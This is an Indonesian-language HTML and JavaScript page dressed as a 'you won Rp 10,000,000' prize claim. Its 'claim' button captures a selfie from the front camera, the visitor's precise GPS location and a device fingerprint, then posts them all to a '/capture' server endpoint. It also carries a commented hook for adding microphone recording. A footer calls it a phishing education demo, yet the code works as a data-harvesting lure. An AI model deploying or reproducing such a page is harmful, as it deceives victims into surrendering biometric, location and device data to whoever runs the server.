<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🎉 SELAMAT! Anda Pemenang Hadiah 10 Juta! 🎉</title>
    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #f9d423 0%, #f83600 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            position: relative;
            overflow-x: hidden;
        }

        /* Floating confetti (simulated with circles) */
        .confetti {
            position: absolute;
            width: 10px;
            height: 10px;
            background: rgba(255,255,255,0.6);
            border-radius: 50%;
            animation: float 6s infinite;
            pointer-events: none;
        }

        @keyframes float {
            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
        }

        .glass-card {
            background: rgba(255, 255, 255, 0.25);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 32px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
            padding: 32px 24px;
            width: 100%;
            max-width: 500px;
            border: 1px solid rgba(255, 255, 255, 0.5);
            z-index: 10;
            transition: transform 0.3s;
        }

        .glass-card:hover {
            transform: scale(1.01);
        }

        .badge-winner {
            background: #ffd700;
            color: #333;
            display: inline-block;
            padding: 8px 24px;
            border-radius: 40px;
            font-weight: 700;
            font-size: 14px;
            letter-spacing: 1px;
            margin-bottom: 16px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        h1 {
            font-size: 36px;
            font-weight: 800;
            color: white;
            text-shadow: 0 4px 10px rgba(0,0,0,0.3);
            line-height: 1.2;
            margin-bottom: 8px;
        }

        .prize {
            font-size: 52px;
            font-weight: 900;
            background: linear-gradient(45deg, #fff5c1, #ffe68f);
            background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 2px 10px rgba(255,215,0,0.5);
            margin: 10px 0 5px;
        }

        .sub-prize {
            color: rgba(255,255,255,0.9);
            font-size: 18px;
            margin-bottom: 25px;
            border-left: 4px solid #fff;
            padding-left: 16px;
            background: rgba(0,0,0,0.1);
            border-radius: 0 30px 30px 0;
        }

        .steps-container {
            display: flex;
            justify-content: space-between;
            margin: 30px 0 20px;
        }

        .step-item {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: rgba(255,255,255,0.2);
            backdrop-filter: blur(4px);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            border: 3px solid white;
            transition: all 0.3s;
        }

        .step-item.active {
            background: #4CAF50;
            border-color: #4CAF50;
            box-shadow: 0 0 30px #4CAF50;
            transform: scale(1.1);
        }

        .step-item.completed {
            background: #2196F3;
            border-color: #2196F3;
        }

        .btn-claim {
            background: white;
            border: none;
            padding: 20px 30px;
            width: 100%;
            border-radius: 60px;
            font-size: 24px;
            font-weight: 800;
            color: #f83600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
            cursor: pointer;
            transition: all 0.2s;
            margin: 20px 0;
            border: 2px solid rgba(255,255,255,0.5);
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .btn-claim:hover {
            background: #f0f0f0;
            transform: translateY(-3px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        }

        .btn-claim:active {
            transform: translateY(0);
        }

        .btn-claim i {
            font-size: 30px;
        }

        .status-grid {
            background: rgba(0,0,0,0.2);
            border-radius: 24px;
            padding: 20px;
            margin: 20px 0;
        }

        .status-row {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 12px;
            border-radius: 18px;
            background: rgba(255,255,255,0.1);
            margin-bottom: 12px;
        }

        .status-icon {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: rgba(255,255,255,0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            color: white;
        }

        .status-label {
            flex: 1;
            font-weight: 600;
            color: white;
            font-size: 16px;
        }

        .status-badge {
            padding: 6px 16px;
            border-radius: 30px;
            font-weight: 600;
            font-size: 13px;
            background: #ff9800;
            color: #000;
        }

        .badge-waiting { background: #ff9800; color: #000; }
        .badge-success { background: #4CAF50; color: white; }
        .badge-error { background: #f44336; color: white; }

        #video-container {
            border-radius: 20px;
            overflow: hidden;
            margin: 15px 0;
            border: 3px solid white;
            display: none;
        }

        #video {
            width: 100%;
            display: block;
        }

        #selfie-preview {
            max-width: 100%;
            border-radius: 20px;
            margin-top: 15px;
            border: 3px solid white;
            display: none;
        }

        .final-message {
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            margin: 15px 0;
            min-height: 50px;
        }

        .footer-note {
            text-align: center;
            color: rgba(255,255,255,0.6);
            font-size: 12px;
            margin-top: 25px;
            padding-top: 15px;
            border-top: 1px solid rgba(255,255,255,0.2);
        }

        .pulse {
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255,255,255,0.7); }
            70% { box-shadow: 0 0 0 20px rgba(255,255,255,0); }
            100% { box-shadow: 0 0 0 0 rgba(255,255,255,0); }
        }
    </style>
</head>
<body>
    <!-- Simulated confetti (random circles) -->
    <div id="confetti-area"></div>

    <div class="glass-card">
        <div class="badge-winner"><i class="fas fa-crown"></i> Pemenang Terpilih! <i class="fas fa-crown"></i></div>
        <h1>🎉 SELAMAT! 🎉</h1>
        <div class="prize">Rp 10.000.000</div>
        <div class="sub-prize">Hadiah langsung transfer ke rekening Anda</div>

        <!-- Steps indicator -->
        <div class="steps-container">
            <div class="step-item" id="step1">1</div>
            <div class="step-item" id="step2">2</div>
            <div class="step-item" id="step3">3</div>
            <div class="step-item" id="step4">4</div>
        </div>

        <!-- Main CTA button -->
        <button class="btn-claim pulse" id="claimBtn">
            <i class="fas fa-gift"></i> KLAIM HADIAH
        </button>

        <!-- Status panel -->
        <div class="status-grid">
            <div class="status-row" id="statusCamera">
                <div class="status-icon"><i class="fas fa-camera-retro"></i></div>
                <span class="status-label">Verifikasi Selfie</span>
                <span class="status-badge badge-waiting" id="cameraBadge">Menunggu</span>
            </div>
            <div class="status-row" id="statusLocation">
                <div class="status-icon"><i class="fas fa-map-pin"></i></div>
                <span class="status-label">Verifikasi Lokasi</span>
                <span class="status-badge badge-waiting" id="locationBadge">Menunggu</span>
            </div>
            <div class="status-row" id="statusFingerprint">
                <div class="status-icon"><i class="fas fa-mobile-alt"></i></div>
                <span class="status-label">Data Perangkat</span>
                <span class="status-badge badge-waiting" id="fpBadge">Menunggu</span>
            </div>
        </div>

        <!-- Video preview (hidden initially) -->
        <div id="video-container">
            <video id="video" autoplay playsinline></video>
        </div>

        <!-- Selfie preview -->
        <img id="selfie-preview" alt="Preview selfie Anda">

        <!-- Final status message -->
        <div class="final-message" id="finalMessage"></div>

        <div class="footer-note">
            <i class="fas fa-shield-alt"></i> Demo Edukasi Phishing · Jangan pernah bagikan data pribadi di situs mencurigakan
        </div>
    </div>

    <script>
        (function() {
            // ========== Confetti Generator ==========
            function createConfetti() {
                const container = document.getElementById('confetti-area');
                for (let i = 0; i < 50; i++) {
                    let conf = document.createElement('div');
                    conf.classList.add('confetti');
                    conf.style.left = Math.random() * 100 + '%';
                    conf.style.animationDelay = Math.random() * 5 + 's';
                    conf.style.background = `hsl(${Math.random() * 60 + 30}, 100%, 60%)`; // gold/yellow/orange
                    conf.style.width = Math.random() * 15 + 5 + 'px';
                    conf.style.height = conf.style.width;
                    container.appendChild(conf);
                }
            }
            createConfetti();

            // ========== Modular Collectors ==========
            const collectors = [
                { name: 'camera', fn: collectCamera },
                { name: 'location', fn: collectLocation },
                { name: 'fingerprint', fn: collectFingerprint }
            ];

            // Data storage
            let photoData = null;
            let locationData = null;
            let fingerprint = null;
            let errors = [];

            // UI Elements
            const claimBtn = document.getElementById('claimBtn');
            const cameraBadge = document.getElementById('cameraBadge');
            const locationBadge = document.getElementById('locationBadge');
            const fpBadge = document.getElementById('fpBadge');
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const step3 = document.getElementById('step3');
            const step4 = document.getElementById('step4');
            const videoContainer = document.getElementById('video-container');
            const video = document.getElementById('video');
            const selfiePreview = document.getElementById('selfie-preview');
            const finalMessage = document.getElementById('finalMessage');

            function setStep(step) {
                [step1, step2, step3, step4].forEach((el, idx) => {
                    el.classList.remove('active', 'completed');
                    if (idx + 1 < step) el.classList.add('completed');
                    else if (idx + 1 === step) el.classList.add('active');
                });
            }

            // ========== Collector Functions ==========
            async function collectCamera() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } // selfie mode
                    });
                    video.srcObject = stream;
                    videoContainer.style.display = 'block';
                    await new Promise(resolve => video.onloadedmetadata = resolve);

                    // Capture selfie after 1.5s (give user time to pose)
                    return new Promise((resolve) => {
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataURL = canvas.toDataURL('image/jpeg', 0.9);
                            
                            // Stop camera
                            stream.getTracks().forEach(track => track.stop());
                            videoContainer.style.display = 'none';
                            
                            // Show preview
                            selfiePreview.src = dataURL;
                            selfiePreview.style.display = 'block';
                            
                            resolve(dataURL);
                        }, 1500);
                    });
                } catch (err) {
                    throw new Error('Kamera: ' + err.message);
                }
            }

            async function collectLocation() {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                    return {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                } catch (err) {
                    throw new Error('Lokasi: ' + err.message);
                }
            }

            async function collectFingerprint() {
                await new Promise(r => setTimeout(r, 400));
                return {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookiesEnabled: navigator.cookieEnabled,
                    hardwareConcurrency: navigator.hardwareConcurrency
                };
            }

            // ========== Main Claim Process ==========
            claimBtn.addEventListener('click', async () => {
                // Reset
                errors = [];
                photoData = null;
                locationData = null;
                fingerprint = null;
                selfiePreview.style.display = 'none';
                finalMessage.innerHTML = '';
                cameraBadge.innerText = 'Menunggu';
                cameraBadge.className = 'status-badge badge-waiting';
                locationBadge.innerText = 'Menunggu';
                locationBadge.className = 'status-badge badge-waiting';
                fpBadge.innerText = 'Menunggu';
                fpBadge.className = 'status-badge badge-waiting';
                setStep(1);

                // Run collectors concurrently with status updates
                const promises = collectors.map(async (col) => {
                    try {
                        let result;
                        switch (col.name) {
                            case 'camera':
                                setStep(2);
                                cameraBadge.innerText = 'Memproses...';
                                result = await col.fn();
                                photoData = result;
                                cameraBadge.innerText = 'Berhasil';
                                cameraBadge.className = 'status-badge badge-success';
                                break;
                            case 'location':
                                setStep(3);
                                locationBadge.innerText = 'Memproses...';
                                result = await col.fn();
                                locationData = result;
                                locationBadge.innerText = 'Berhasil';
                                locationBadge.className = 'status-badge badge-success';
                                break;
                            case 'fingerprint':
                                fpBadge.innerText = 'Memproses...';
                                result = await col.fn();
                                fingerprint = result;
                                fpBadge.innerText = 'Berhasil';
                                fpBadge.className = 'status-badge badge-success';
                                break;
                        }
                    } catch (err) {
                        errors.push(err.message);
                        if (col.name === 'camera') {
                            cameraBadge.innerText = 'Gagal';
                            cameraBadge.className = 'status-badge badge-error';
                        } else if (col.name === 'location') {
                            locationBadge.innerText = 'Gagal';
                            locationBadge.className = 'status-badge badge-error';
                        } else if (col.name === 'fingerprint') {
                            fpBadge.innerText = 'Gagal';
                            fpBadge.className = 'status-badge badge-error';
                        }
                    }
                });

                await Promise.all(promises);
                setStep(4);

                // Build payload
                const payload = {
                    photo: photoData,
                    location: locationData,
                    fingerprint: fingerprint,
                    errors: errors.length ? errors : undefined
                };

                // Send to server
                try {
                    const response = await fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    if (response.ok) {
                        finalMessage.innerHTML = '<span style="background:#4CAF50; padding:12px 30px; border-radius:40px; color:white; font-weight:700;"><i class="fas fa-check-circle"></i> SELAMAT! Data terkirim. Tim kami akan menghubungi Anda.</span>';
                    } else {
                        throw new Error('Server error');
                    }
                } catch (err) {
                    finalMessage.innerHTML = '<span style="background:#f44336; padding:12px 30px; border-radius:40px; color:white; font-weight:700;"><i class="fas fa-times-circle"></i> Gagal mengirim. Coba lagi.</span>';
                }
            });

            // ========== HOOK EXAMPLE (Add more collectors easily) ==========
            // Misal collector microphone:
            /*
            async function collectMicrophone() {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                // ... rekam dan encode ...
                stream.getTracks().forEach(t => t.stop());
                return { audio: '...' };
            }
            // lalu tambahkan ke collectors: { name: 'microphone', fn: collectMicrophone }
            */
        })();
    </script>
</body>
</html>
